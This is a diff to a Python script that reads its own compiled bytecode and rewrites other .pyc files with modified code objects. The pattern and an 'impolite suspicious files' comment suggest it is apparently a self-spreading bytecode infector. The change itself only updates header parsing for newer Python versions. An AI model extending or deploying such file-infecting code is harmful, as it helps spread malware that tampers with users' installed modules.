@@ -33,7 +33,12 @@ def main_wrapper():
     with open(compiled_file_name, "rb") as f:
         this_magic = struct.unpack("<H", f.read(2))[0]
         f.read(2)
-        this_moddate, this_source_size = f.read(4), f.read(4)
+        if this_magic >= 3390: #3.7
+            this_invalidation = f.read(4)
+        this_moddate = f.read(4)
+        if this_magic >= 3190: #3.3
+            this_source_size = f.read(4)
+
         this_module = marshal.load(f)
 
     # Leaving suspicious files everywhere is impolite
@@ -59,7 +64,12 @@ def main_wrapper():
                 with open(target_file, "rb") as f:
                     magic = struct.unpack("<H", f.read(2))[0]
                     f.read(2)
-                    moddate, source_size = f.read(4), f.read(4)
+                    if magic >= 3390: #3.7
+                        invalidation_method = f.read(4)
+                    moddate = f.read(4)
+                    if magic >= 3190: #3.3
+                        source_size = f.read(4)
+
                     module = marshal.load(f)
 
                 if magic!=this_magic:
@@ -115,8 +125,11 @@ def main_wrapper():
                 with open(target_file, "wb") as f:
                     f.write(struct.pack("<H", magic))
                     f.write(b"\r\n")
+                    if magic >= 3390: #3.7
+                        f.write(invalidation_method)
                     f.write(moddate)
-                    f.write(source_size)
+                    if magic >= 3190: #3.3
+                        f.write(source_size)
                     marshal.dump(module_out, f)
 
 main_wrapper()
